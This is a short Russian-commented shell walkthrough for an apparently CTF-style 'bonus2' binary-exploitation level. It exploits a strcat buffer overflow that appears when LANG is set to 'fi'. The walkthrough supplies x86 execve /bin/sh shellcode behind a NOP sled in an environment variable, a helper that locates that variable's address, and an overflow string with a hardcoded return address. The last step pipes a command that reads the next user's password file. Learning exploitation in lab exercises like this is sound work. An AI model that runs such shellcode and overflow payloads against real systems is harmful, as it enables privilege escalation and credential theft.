# 1. Найти функции main и greetuser при помощи gdb
# 2. Функция main копирует два аргумента в два массива, первый передаёт в функцию greetuser
# 3. В ней устанавливается глобальная переменная language, в зависимости от переменной окружения LANG
# 4. Функция greetuser добавляет ко вводу строку с приветсвием при помощи уязвимой функции strcat и выводит
# 5. Если язык "fi", приветсвие слишком длинное и можно переписать указатель возврата в greetuser
    export LANG=fi
# 6. Если взять имя длины первого массива, а во второй записать, то strcat перескочит на второй аргумент программы
    NAME=$(python -c "print 'x' * 40")
# 6. Нужно взять шелл-код
    SHELLCODE="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
# 7. Сохранить в переменной окружения шелл код с нопами
    export BONUS2=$(python -c "print '\x90' * 90 + '$SHELLCODE'")
# 5. Написать код для определения адреса этой переменной
    echo -e '#include <stdio.h>\nint main() {printf("%p\\n", (void *)getenv("BONUS2"));}' > /tmp/bonus2.c
# 6. Скомпилировать, запустить, найти адрес
    gcc /tmp/bonus2.c -o /tmp/bonus2 && /tmp/bonus2
# 9. Сохранить строку для ввода с переполнением буфера и адресом шелл-кода + несколько байт
    EXPLOIT=$(python -c 'print "x" * 18 + "\x8c\xfe\xff\xbf"')
# 10. Запустить программу с именем и этой строкой и забрать пароль
    (./bonus2 $NAME $EXPLOIT) <<< "cat /home/user/bonus3/.pass"
